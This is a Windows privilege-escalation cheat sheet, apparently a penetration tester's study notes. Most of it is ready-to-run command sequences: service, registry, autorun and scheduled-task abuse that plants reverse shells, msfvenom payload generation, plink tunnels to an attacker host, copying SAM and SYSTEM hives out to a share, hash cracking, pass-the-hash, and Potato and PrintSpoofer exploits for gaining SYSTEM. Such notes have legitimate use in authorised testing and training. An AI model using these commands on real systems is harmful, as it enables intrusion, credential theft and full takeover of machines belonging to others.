# Windows Privilege Escalation

## Privilege Escalation Strategy

### Enumeration

1. Check current user (`whoami`) and groups (`net user username`)
2. Run winPEAS with `fast searchfast cmd`
3. Run winPEAS again with only `cmd`
4. Run `Seatbelt` and other scripts
5. If scripts are failing try manual commands from below or from other cheatsheets [PayloadsAllTheThings Windows Privilege Escalation)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Strategy

- Spend time going over enumeration results
- Note interesting results
- Avoid rabbit holes by creating checklist for attack vectors
- Check for files in common locations
  - Desktop
  - C:\
  - C:\Program Files
- Try easy things first
  - Registry exploits
  - Services
- Check admin processes for their versions and possible known exploits
- Check for internal ports for interesting services -> port forwarding
- If still no luck, go over results again and highlight anything odd
- Think about kernel exploits as last resort

---

## Port Forwarding

- Make service listening on internal port available to us
- Forward port on Kali to internal port on Windows
- Use `plink.exe`
- Useful to bypass blocked ports through firewall
- Edit `/etc/ssh/sshd_config` and set `PermitRootLogin` to `Yes` and restart ssh service

```bat
" Forward local port through ssh with plink
" First 445 is port on kali
" IP belongs to victim
" Second 445 is port on victim -> port of service we want to access
.\plink.exe root@ATTACKER-IP -R 445:127.0.0.1:445

" Execute winexe from kali
winexe -U 'admin%password' //127.0.0.1 cmd.exe
```

---

## Permissions in Windows

### User Accounts

- Collection of settings bound to unique identity
- Local "Administrator" created by default

### Service Accounts

- Used to run services
- Can't sign in to Windows
- "SYSTEM" is default service account with highest privileges of any local account

### Groups

- Multiple groups wiht multiple users
- Easier access control for whole group
- Regular groups (Administrators, Users) with set list of members
- Pseduo groups ("Authenticated Users") dynamic list of members

### Resources

- Files/Directories
- Registry Entries
- Services
- Access to resources by users and groups depend on resource's access control list (ACL)

### Access Tokens

- Store user's identity and privileges
- Primary Access Token
  - Created on login
  - Bound to current user session
  - Attached to new processes
- Impersonation Access Token
  - Created when process needs to temporarily run with privileges of other user

### Token Duplication

- Windows allows processes to duplicate their access tokens
- Impersonation token can be duplicated into primary access token
- If we can inject into process we can duplicate its access token and spawn separate process with same privileges

### Named Pipes

- Extension of regular pipes
- Process can create named pipe and other processes can open it to read/write data from/to it
- Process who created named pipe can impersonate privileges of processes connecting to the named pipe

---

## User Privileges

- [https://github.com/hatRiot/token-priv](Detailed paper)
- Same user privileges can be used to escalate to SYSTEM
- List privileges with `whoami /priv`
- Disabled state of privilege is irrelevant. If it's listed we have it

### SeImpersonatePrivilege

- Grants ability to impersonate any access tokens obtained
- Spawn new process as SYSTEM
- Used by Juicy Potato

### SeAssignPrimaryPrivilege

- Similar to SeImpersonatePrivilege
- Enables user to assign access token to new process
- Also used by Juicy Potato

### SeBackupPrivilege

- Grants read access to all objects on system regardless of ACL
- Gain access to sensitive files
- Extract hashes from registry for cracking or PTH attacks

### SeRestorePrivilege

- Grants write access to all objects on system regardless of ACL
- Modify service binaries
- Overwrite DLLs used by SYSTEM processes
- Modify registry settings

### SeTakeOwnershipPrivilege

- Lets user take ownership over object (WRITE_OWNER permission)
- Modify objects ACL to grants yourself write access
- Same methods used with SeRestorePrivilege apply

### Other Interesting Privileges

- SeTcbPrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeDebugPrivilege (used by `getsystem`)

---

## Spawning Administrator Shells

- Generate reverse shell with `msfvenom` and execute it
- Add user to administrators group, enable RDP then spawn administrator command prompt via the GUI

```
net localgroup adminstrators <username> /add
```

- To escalate from admin user to SYSTEM, use `PsExec` from SysInternals

```
.\PsExec64.exe -accepteula -i -s shell.exe
```

---

## Tools

- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

```bat
" Enable colors for output
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [SharpUp.exe (precompiled)](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)

---

## Kernel Exploits

- Enumerate Windows version and path level (systeminfo)
- Find matching exploits
- Compile and run
- Can be unstable or cause crashes
- Compare possible found exploits with available precompiled binaries

### Tools

- [WESNG](https://github.com/bitsadmin/wesn)
- [Precompiled Exploits](https://github.com/SecWiki/windows-kernel-exploits)
- [Watson](https://github.com/rasta-mouse/Watson)

---

## Service Exploits

- Misconfigured services running with SYSTEM permissions

```bat
" Query service config
sc.exe qc <name>

" Query current status of service
sc.exe query <name>

" Modify config option of service
sc.exe config <name> <option>= <value>

" Start/stop service
net start <name>
net stop <name>
```

### Insecure Service Properties

- Interesting properties
  - SERVICE_STOP
  - SERVICE_START
  - SERVICE_CHANGE_CONFIG
  - SERVICE_ALL_ACCESS
- If you can start/stop service and change configuration, replace executable of service with reverse shell

```bat
" Run winPEAS service enumeration
.\winPEASany.exe quiet servicesinfo

" Check permissions for service on current user
.\accesschk.exe /accepteula -uwcqv user daclsvc

" Query service config
sc qc daclsvc

" Check current state of service
sc query daclsvc

" Set binary path to location to reverse shell
sc config daclsvc binpath= "\"C:\Windows\Temp\shell.exe\""

" Start service
net start daclsvc
```

### Unqouted Service Path

- Exectuables can be run without extension
- `C:\Program Files\Some Dir\SomeProgram.exe`
- Exectuable could be
  - C:\Program.exe
  - C:\Program Files\Some.xe
  - C:\Program Files\Some Dir\SomeProgram.exe
- Check for write permissions on path
- Check if we can start/stop service
- Create reverse shell

```bat
" Run winPEAS service enumeration
.\winPEASany.exe quiet servicesinfo

" Check for write permissions in path
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unqoted Path Service\"

" Copy reverse shell
copy shell.exe "C:\Program Files\Unqoted Path Service\Common.exe"

" Start service
net start unqotedsvc
```

### Weak Registry Permissions

- Registry entries can have misconfigured ACLs as well
- Modify service configuration without modifying service directly

```powershell
# Run winPEAS service enumeration
.\winPEASany.exe quiet servicesinfo

# Check ACL for service entry
Get-ACL HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

# Check service configuration
.\accesschk.exe /accepteula -ucqv user regsvc

# Check current values in registry entry
reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc

# Overwrite path value to reverse shell
reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\shell.exe /f

# Start service
net start regsvc
```

### Insecure Service Executables

- If original service executable can be modified we can just replace it with our own shell
- Remember to create backup

```bat
" Run winPEAS service enumeration
.\winPEASany.exe quiet servicesinfo

" Verify that executable is writeable
.\accesschk.exe /accepteula -uvwq "C:\Program Files\File Permissions Service\filepermservice.exe"

" Verify service config
.\accesschk.exe /accepteula -uvqc filepermsvc

" Back up original exe
copy "C:\Program Files\File Permissions Service\filepermservice.exe" "C:\Windows\Temp\filepermservice.exe.bak"

" Overwrite exe with shell
copy /Y C:\Windows\Temp\shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe"

" Start service
net start filepermsvc

" Clean up
copy /Y "C:\Program Files\File Permissions Service\filepermservice.exe" "C:\Windows\Temp\filepermservice.exe.bak" "C:\Program Files\File Permissions Service\filepermservice.exe"
```

### DLL Hijacking

- Will be executed with same privileges as loading service
- If loaded with absolute path and writable might be possible to privesc
- More common is if DLL is missing and directory is writable
- Not much automation possible
- Check if PATH folders are writable
- Enumerate non-standard service if it's possible to stop/start them
- Copy exe to local system and analyze is with `Process Monitor (procmon)`
- Add filters for
  - ProcessName: svc.exe
  - Result: NAME NOT FOUND
  - Operation: CreateFile

```bat
" Run winPEAS service enumeration
.\winPEASany.exe quiet servicesinfo

" Check service configuration
.\accesschk.exe /accepteula -uvqc user dllsvc

" Query config on which exe is being used for service and privileges
sc qc dllsvc

" Generate shell dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f dll -o shell.dll

" Copy malicious dll to required location
copy \\IP\SHARE\shell.dll C:\Temp

" Stop and start service
net stop dllsvc
net start dllsvc
```

---

## Registry

### AutoRuns

- Look for configured AutoRuns in Registry
- If we can write to AutoRun exe and can restart system, we can privesc
- On newer versions of Windows AutoRuns run with permissions of last logged in user

```bat
" Run winPEAS to get application information
.\winPEASany.exe quiet applicationsinfo

" Query registry for AutoRuns
reg query HKML\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

" Verify exe permissions
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

" Backup original exe
copy "C:\Program Files\Autorun Program\program.exe" "C:\Temp\program.exe.bak"

" Replace with shell
copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"

" Restart system
shutdown /r /t 0

" Clean up
copy /Y "C:\Temp\program.exe.bak" "C:\Program Files\Autorun Program\program.exe"
```

### AlwaysInstallElevated

- MSI used to install applications
- Usually run with permissions of user but can be run with elevated privileges
- Generate malicious MSI file containing reverse shell
- Needs two registry settings to be enabled
- AlwaysInstallElevated must be 1 for local machine and user
  - `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
  - `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`

```bat
" Run winPEAS to get appropriate information
.\winPEASany.exe quiet windowscreds

" Query registry for settings
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

" Generate reverse shell on kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f msi -o shell.msi

" Copy over msi file
copy \\IP\SHARE\shell.msi C:\Temp

" Execute it
msiexec /quiet /qn /i shell.msi
```

---

## Passwords

- Password re-use
- Cleartext passwords

### Registry

- Windows might store passwords here
- Could be in plaintext

```bat
" Run winPEAS to get relevant information
.\winPEASany.exe quiet filesinfo userinfo

" Query registry for credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

" On kali

" Spawn shell as regular user
winexe -U 'username%password' //IP cmd.exe

" Spawn admin shell
winexe -U 'username%password' --system //IP cmd.exe
```

### Saved Credentials

- Run command as other user with `runas`
- Possible if credentials are stored in system to bypass authentication

```bat
" Run winPEAS to get relevant information
.\winPEASany.exe quiet cmd windowscreds

" Get stored credentials
cmdkey /list

" Execute reverse shell as other user
runas /savecred /user:admin C:\Temp\shell.exe
```

### Configuration Files

- Configuration files with cleartext passwords
- Limit manual search to
  - User home directory
  - Temp
  - Suspicious programs

```bat
" Run winPEAS to get relevant information
.\winPEASany.exe quiet cmd searchfast filesinfo

" Recursively search for files in current directory with pass in name or ending in .config
dir /s *pass* == *.config*

" Recursively search for files in current directory containing password and end in .xml, .ini or .txt
findstr /si password *.xml *.ini *.txt
```

### SAM

- Windows stores password hashes in Security Account Manager (SAM)
- Hashes are encrypted with key in file named `SYSTEM`
- If file is readable we can decrypt passwords
- Files locked while Windows is running
- Usually located in `C:\Windows\System32\config`
- Backups might exist in
  - `C:\Windows\Repair`
  - `C:\Windows\System32\config\RegBack`

```bat
" Run winPEAS to get relevant information
.\winPEASany.exe quiet cmd searchfast filesinfo

" Copy files to local machine
copy C:\Windows\Repair\SYSTEM \\IP\SHARE\
copy C:\Windows\Repair\SAM \\IP\SHARE\

" Get creddump7 suite for proper tools
git clone https://github.com/Neohapsis/creddump7.git

" Dump hashes from files
" Use second part, NTLM hash
" NTLM hash starting with 31d6 means empty string so account either no password or disabled
python2 pwdump.py SYSTEM SAM

" Crack hash with hashcat
hashcat -m 1000 hash wordlist
```

### Passing the Hash

- Use hash instead of password for authentication
- Use modified version of `winexe`, `pth-winexe` to spawn shell

```bash
# Spawn regular user shell
pth-winexe -U 'admin%LM:NTLM' //IP cmd.exe

# Spawn system shell
pth-winexe -U 'admin%LM:NTLM' --system //IP cmd.exe
```

---

## Scheduled Tasks

- Like cronjobs on Linux
- Run with privileges of user usually but can be run as other users
- Look in uncommon directories for scripts

```powershell
# Manually check for scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | where {_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

# Verify permissions on script
.\accesschk.exe /accepteula -quv user CleanUp.ps1

# Backup script
copy C:\Scripts\script.ps1 C:\Temp\script.ps1.bak

# Append line to execute our reverse shell
echo C:\Temp\shell.exe >> C:\Scripts\script.ps1

# Clean up
copy /Y C:\Temp\script.ps1.bak C:\Temp\script.ps1
```

---

## Insecure GUI Apps

- Apps can be allowed to run GUI apps with admin privileges
- Use native Windows and GUI apps own functionality to spawn shell
- Similar to Citirx breakouts
- Open `cmd.exe` in GUI using following path
  - `file://C:\Windows\System32\cmd.exe`

```bat
" Check privileges of running program
tasklist /V | findstr program.exe
```

---

## Startup Apps

- Directory for startup apps for all users
  - `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
- If directory is writable we can place reverse shell in here and wait for admin to log in
- Must be .lnk files

```bat
" Check permissions on startup directory
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

" Run VBS script
cscript C:\Temp\CreateShortcut.vbs
```

### VBS Script to Create Shortcut

```vb
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shell.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Temp\shell.exe"
oLink.Save
```

---

## Installed Applications

- Find known exploits for installed applications
- Filter for "Has App" on ExploitDB
- Mostly use previously covered methods of privilege escalation

```bat
" Enumerate running programs
tasklist /V

" Use Seatbelt to find non-standard processes
.\Seatbelt.exe NonstandardProcesses

" Use winPEAS to get process information
.\winPEASany.exe quiet processinfo
```

---

## Hot Potato

- Uses spoofing along with NTLM relay to gain SYSTEM
- Tricks Windows into authenticating as SYSTEM to fake HTTP server using NTLM
- Credentials then get relayed to SMB for command execution
- Works on Windows 7, 8 and early versions of Windows 10 including server versions

```bat
" Verify privileges
whoami /priv

" Run on victim to execute reverse shell on victim
.\potato.exe -ip VICTIM-IP -cmd "C:\Temp\shell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

---

## Token Impersonation

### Service Accounts

- Can have special priviliges
- Can't login directly
- Easy for privilege escalation
- Get reverse shell throug executing asp code on IIS server or SQLi on MSSQL server

### Rotten Potato

- Service accounts intercept SYSTEM ticket and use it for impersonation
- Possible because service accounts usually have `SeImpersonatePrivilege` privilege enabled

### SeImpersonate / SeAssignPrimaryToken

- Enabled mostly by default on service accounts
- Allow impersonation of SYSTEM user
- Any user with these privileges can exploit token impersonation

### Juicy Potato

- Improved version of Rotten Potato
- [https://github.com/ohpe/juicy-potato](Github)
- Patched on latest version of Windows 10

```bat
" Start reverse shell as local service
" Administrator privileges needed
.\PSExec64.exe -accepteula -i -u "nt authority\local service" C:\Temp\shell.exe

" Check current privileges
whoami /priv

" Run juicy potato
" Port must be available
" CLSID of current windows version must be valid
" List of valid CLSIDs can be found on Juicy Potato github
.\JuicyPotato.exe -p 443 -p C:\Temp\shell.exe -t * -c {CLSID}
```

### Rogue Potato

- Latest potato exploit
- [https://github.com/antonioCoco/RoguePotato](Github)
- [https://github.com/antonioCoco/RoguePotato/releases](Compiled executables)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](Blog Post)
- Admin access and PSExec binary needed

```bash
# Redirect traffic on local port 135 to victim on port 9999
socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.22:9999
```

```bat
" Start cmd with admin privileges
" Verify privileges
whoami /priv

" Get reverse shell as service account (not needed if you already have a shell with appropriate privileges or service account)
.\PSExec64.exe /accepteula -i -u "nt authority/local service" C:\Temp\shell.exe

" Spawn system shell with Rogue Potato
.\RoguePotato.exe -r ATTACKER-IP -l 9999 -e "C:\Temp\shell.exe"
```

### PrintSpoofer

- Targets Print Spooler service
- Doesn't require port forwarding
- [https://github.com/itm4n/PrintSpoofer](Github)
- [https://it4n.github.io/printspoofer-abusing-impersonate-privileges](Blog Post)
- Requires vc_redist.x64 to be installed

```bat
" Start cmd with admin privileges
" Verify privileges
whoami /priv

" Install vc_redist.x64.exe
.\vc_redist.x64.exe

" Get reverse shell as service account (not needed if you already have a shell with appropriate privileges or service account)
.\PSExec64.exe /accepteula -i -u "nt authority/local service" C:\Temp\shell.exe

" Run reverse shell with PrintSpoofer
.\PrintSpoofer.exe -i -c "C:\Temp\shell.exe"
```

---

## getsystem

### Named Pipe Impersonation (In Memory/Admin)

- Creates named pipe controlled by meterpreter
- Creates service running as SYSTEM that interacts with named pipe
- Meterpreter impersonates SYSTEM process to get impersonation access token with SYSTEM privileges
- Token is assigned to all Meterpreter threads to get SYSTEM privileges

### Named Pipe Impersonation (Dropper/Admin)

- Similar to In Memory/Admin
- DLL is written to disk
- Service created to run DLL as SYSTEM
- DLL connects to named pipe

### Token Duplication (In Memory/Admin)

- Requires `SeDebugPrivilege`
- Inject DLL into service running as SYSTEM
- DLL duplicates access token and assigns it to meterpreter
- Only works on x86
- Operates entirely in memory